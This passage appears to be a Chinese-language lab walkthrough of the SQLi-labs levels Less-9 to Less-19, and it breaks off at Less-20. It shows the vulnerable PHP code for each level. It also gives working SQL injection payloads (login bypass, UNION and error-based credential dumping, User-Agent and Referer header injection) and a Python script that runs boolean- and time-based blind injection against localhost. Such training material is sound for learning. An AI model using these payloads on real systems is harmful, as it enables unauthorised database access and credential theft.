class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line"><span class="comment">//print_r(mysqli_error($con1));</span></span><br><span class="line"><span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># modified : Time_Blind_SQL_Attack()</span></span><br><span class="line">url = <span class="string">&quot;http://localhost/SQLlabs/Less-9/?id=1&#x27; &quot;</span></span><br><span class="line">payload = <span class="string">f&quot;and sleep(if(BINARY substr((select group_concat(username) from users),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;,2,0)) --+&quot;</span></span><br></pre></td></tr></table></figure><h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><blockquote><p>Less-10 Blind- Time based- Double Quotes- String</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>在Less-9的基础上把<code>?id=1&#39;</code>改成<code>?id=1&quot;</code>就能过。</p><h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><blockquote><p>Post  Less-11- Error Based- String</p></blockquote><p>第一个Post类型的注入，也更接近渗透时候的操作。</p><p>按照前面Get型的方式注了一通，发现都失败了看看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>结论：可以直接在前端框框中输出也可以用工具Post提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">--------------------万能公式--------------------</span><br><span class="line">uname=admin&#x27; or &#x27;1&#x27;=&#x27;1 #</span><br><span class="line">&amp;passwd=1</span><br><span class="line">--------------------查询语句变为--------------------</span><br><span class="line">&quot;SELECT username, password FROM users WHERE username=&#x27;admin&#x27; or &#x27;1&#x27;=&#x27;1 #&#x27; and password=&#x27;1&#x27; LIMIT 0,1&quot;</span><br><span class="line">--------------------查数据库名和表名--------------------</span><br><span class="line">uname=-1&#x27; union select database(),group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br><span class="line">&amp;passwd=</span><br><span class="line">--------------------查列名--------------------</span><br><span class="line">uname=-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27; and table_schema=database() --+</span><br><span class="line">&amp;passwd=</span><br><span class="line">--------------------查列内容--------------------</span><br><span class="line">uname=-1&#x27; union select group_concat(username,&#x27;--&#x27;),group_concat(password,&#x27;--&#x27;) from users #</span><br><span class="line">&amp;passwd=</span><br></pre></td></tr></table></figure><h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><blockquote><p>Post Less-12- Error Based- Double quotes- String</p></blockquote><p>相对于Less-11 换了闭合条件,只要把Less-11的payload把<code>uname=-1&#39;</code>改成<code>uname=-1&quot;)</code>就能过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">原payload:uname=admin&quot;) # &amp;passwd=</span><br><span class="line">引号化:  &quot;uname=admin&quot;) #&quot; &amp;passwd=&quot;&quot;</span><br><span class="line">括号化:  (&quot;uname=admin&quot;) #&quot;) &amp;passwd=(&quot;&quot;)</span><br><span class="line">--------------------等效于--------------------</span><br><span class="line">SELECT username, password FROM users WHERE username=(&quot;uname=admin&quot;) #&quot;) and password=(&quot;&quot;) LIMIT 0,1</span><br><span class="line">--------------------查数据库名和表名--------------------</span><br><span class="line">uname=-1&quot;) union select database(),group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br><span class="line">&amp;passwd=</span><br></pre></td></tr></table></figure><p>在这里用万能公式输出</p><p><code>Your Login name:Dumb Your Password:Dumb</code></p><p>的原因是因为这个语句将返回所有用户的用户名和密码，但是这里只有能显示1对数据就是第一对数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) or 1=1 #</span><br><span class="line">&quot;admin&quot;) or 1=1 #&quot;</span><br><span class="line">(&quot;admin&quot;) or 1=1 #&quot;)</span><br><span class="line">(&quot;admin&quot;) or 1=1</span><br><span class="line">SELECT username, password FROM users WHERE username= (&quot;admin&quot;) or 1=1</span><br></pre></td></tr></table></figure><h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h1><blockquote><p>Post Less-13- Double Injection- String- with twist</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(&#x27;<span class="subst">$uname</span>&#x27;) and password=(&#x27;<span class="subst">$passwd</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>​    闭合条件为单引号和括号，本质不变，只是改为了post请求，布尔盲注/时间盲注的代码奉上：</p><p>​    同理也可以像Less-5一样构造报错注入，但是这里不再赘述。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:C2yb8er</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Boolean_Blind_SQL_Attack</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):  <span class="comment"># 根据输出长度来定</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz_,ABCDEFGHIJKLMNOPQRSTUVWXYZ-.@&amp;%/^!~&#x27;</span>:</span><br><span class="line">            url = <span class="string">&quot;http://localhost/SQLlabs/Less-13/&quot;</span></span><br><span class="line">            <span class="comment"># 爆数据库名</span></span><br><span class="line">            <span class="comment"># payload = f&quot;admin&#x27;) and BINARY substr((database()), &#123;j&#125;, 1)=&#x27;&#123;i&#125;&#x27;#&quot;</span></span><br><span class="line">            <span class="comment"># 爆表名</span></span><br><span class="line">            <span class="comment"># payload = f&quot;admin&#x27;) and BINARY substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27; #&quot;</span></span><br><span class="line">            <span class="comment"># 爆列名</span></span><br><span class="line">            <span class="comment"># payload = f&quot;admin&#x27;) and BINARY substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;), &#123;j&#125;, 1)=&#x27;&#123;i&#125;&#x27;#&quot;</span></span><br><span class="line">            <span class="comment"># 爆列数据</span></span><br><span class="line">            <span class="comment"># payload = f&quot;admin&#x27;) and BINARY substr((select group_concat(username) from users),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27; #&quot;</span></span><br><span class="line">            payload = <span class="string">f&quot;admin&#x27;) and BINARY substr((select group_concat(password) from users),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27; #&quot;</span></span><br><span class="line">            data = &#123;<span class="string">&quot;uname&quot;</span>: payload, <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">            r = requests.post(url, data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;flag.jpg&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                name += i</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;The final result is :<span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Time_Blind_SQL_Attack</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):  <span class="comment"># 根据输出长度来定</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz_,ABCDEFGHIJKLMNOPQRSTUVWXYZ-.@&amp;%/^!~&#x27;</span>:</span><br><span class="line">            url = <span class="string">&quot;http://localhost/SQLlabs/Less-13/&quot;</span></span><br><span class="line">            <span class="comment"># 爆数据库名</span></span><br><span class="line">            <span class="comment"># payload = f&quot;admin&#x27;) and sleep(if(BINARY substr(database(),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,2,0)) #&quot;</span></span><br><span class="line">            <span class="comment"># 爆表名</span></span><br><span class="line">            <span class="comment"># payload=f&quot;admin&#x27;) and sleep(if(BINARY substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,2,0)) #&quot;</span></span><br><span class="line">            <span class="comment"># 爆列名</span></span><br><span class="line">            <span class="comment"># payload = f&quot;admin&#x27;) and sleep(if(BINARY substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,2,0)) #&quot;</span></span><br><span class="line">            <span class="comment"># 爆列数据名</span></span><br><span class="line">            <span class="comment"># payload = f&quot;admin&#x27;) and sleep(if(BINARY substr((select group_concat(username) from users),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,2,0)) #&quot;</span></span><br><span class="line">            payload = <span class="string">f&quot;admin&#x27;) and sleep(if(BINARY substr((select group_concat(password) from users),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;,2,0)) #&quot;</span></span><br><span class="line">            time1 = datetime.datetime.now()</span><br><span class="line">            data = &#123;<span class="string">&quot;uname&quot;</span>: payload, <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">            r = requests.post(url, data)</span><br><span class="line">            time2 = datetime.datetime.now()</span><br><span class="line">            sec = (time2 - time1).seconds</span><br><span class="line">            <span class="keyword">if</span> sec &gt;= <span class="number">2</span>:</span><br><span class="line">                name += i</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;The final result is :<span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h1><blockquote><p>Post Less-14- Double Injection- Double quotes- String</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=<span class="subst">$uname</span> and password=<span class="subst">$passwd</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>相对于Less-13 换了闭合条件,只要把Less-13的payload把<code>uname=-1&#39;)</code>改成<code>uname=-1&quot;</code>就能过。</p><h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><blockquote><p>Post Less-15- Blind- Boolian Based- String</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line"><span class="comment">//print_r(mysqli_error($con1));</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    取消了报错注入，于是乎布尔盲注和时间盲注都可以。</p><p>​    相对于Less-13 换了闭合条件,只要把Less-13的payload把<code>uname=-1&#39;)</code>改成<code>uname=-1&#39;</code>就能过。</p><h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h1><blockquote><p>Post Less-16- Blind- Time Based- Double quotes- String</p></blockquote><p>同Get类型题目的设置方法，禁用了布尔盲注和报错注入，使用时间盲注：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>相对于Less-13 换了闭合条件,只要把Less-13的payload把<code>uname=-1&#39;)</code>改成<code>uname=-1&quot;)</code>就能过。</p><h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h1><blockquote><p>Post Less-17 Update Query- Error based - String</p></blockquote><p>遇到了新的注入方式：利用Update语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;</span></span><br><span class="line"><span class="variable">$row1</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];  </span><br><span class="line"><span class="comment">//echo &#x27;Your Login name:&#x27;. $row1;</span></span><br><span class="line"><span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$update</span>);</span><br><span class="line"><span class="comment">//echo $update;</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>​    <code>uname</code>进行了过滤但是可以直接利用<code>passwd</code>进行注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">--------------------爆db名--------------------</span><br><span class="line">uname=admin</span><br><span class="line">&amp;passwd=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) #</span><br><span class="line">--------------------爆表名--------------------</span><br><span class="line">uname=admin</span><br><span class="line">&amp;passwd=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1) #</span><br><span class="line">--------------------爆列名--------------------</span><br><span class="line">uname=admin</span><br><span class="line">&amp;passwd=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name=&#x27;users&#x27; ),0x7e),1) #</span><br><span class="line">--------------------爆列内容--------------------</span><br><span class="line">//更换limit条件查看更多</span><br><span class="line">uname=admin</span><br><span class="line">&amp;passwd=1&#x27; and (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(CAST(CONCAT(username, &#x27;--&#x27;, password) AS CHAR),0x7e)FROM users LIMIT 0, 1),FLOOR(RAND(0) * 2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x )a) #</span><br></pre></td></tr></table></figure><p>在这里我们详细解释一下爆列内容部分，不单拉出来这个sql会看起来非常抽象，适当的缩进处理就会非常清晰：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230705/St2iv8rimage.2uwj03np4eg0.png"></p><h1 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h1><blockquote><p>Post Less-18 Header Injection- Error Based- string</p></blockquote><p>又是没学过的知识点，太棒了！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//进行了过滤</span></span><br><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>我们来分析一下，waf机制：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//截断，最多只允许前20个字符</span></span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果启用，则去除斜杠</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;<span class="comment">//如果不是纯数字则会对字符串进行SQL转义处理</span></span><br><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我先不去深究如何Post注入绕过mysqli_real_escape_string转义，回归题目：<code>Header Injection</code>，让我成功想到报文中的请求头进行注入，查看源码确实如此：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">-----------------------------------------------</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure><p>那我们就直接从<code>User-Agent</code>进行注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--------------------原形式--------------------</span><br><span class="line">INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)</span><br><span class="line">--------------------插入UA--------------------</span><br><span class="line">&#x27; or extractvalue(1,concat(0x7e,(database()),0x7e)) or &#x27;</span><br><span class="line">--------------------达成效果--------------------</span><br><span class="line">INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES </span><br><span class="line">(&#x27;&#x27; or extractvalue(1,concat(0x7e,(database()),0x7e)) or &#x27;&#x27;,&#x27;$IP&#x27;, $uname)</span><br><span class="line">--------------------爆列内容--------------------</span><br><span class="line">&#x27;or (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(CAST(CONCAT(username, &#x27;--&#x27;, password) AS CHAR),0x7e)FROM users LIMIT 1, 1),FLOOR(RAND(0) * 2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x )a) or&#x27;</span><br></pre></td></tr></table></figure><p>所以这个只需要按照形式：<code>&#39;or payload or&#39;</code>来伪造UA就能成功注入</p><h1 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h1><blockquote><p>Post Less-19 Header Injection- Referer- Error Based- string</p></blockquote><p>同理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">-------------------------------------------</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--------------------原形式--------------------</span><br><span class="line">INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)</span><br><span class="line">--------------------插入RF--------------------</span><br><span class="line">&#x27; or extractvalue(1,concat(0x7e,(database()),0x7e)) or &#x27;</span><br><span class="line">--------------------达成效果--------------------</span><br><span class="line">INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES </span><br><span class="line">(&#x27;&#x27; or extractvalue(1,concat(0x7e,(database()),0x7e)) or &#x27;&#x27;, &#x27;$IP&#x27;)</span><br></pre></td></tr></table></figure><p>所以这个只需要按照形式：<code>&#39;or payload or&#39;</code>来伪造RF就能成功注入</p><h1 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h1><blockquote><p>Less-20 Cookie Injection- Error Based- 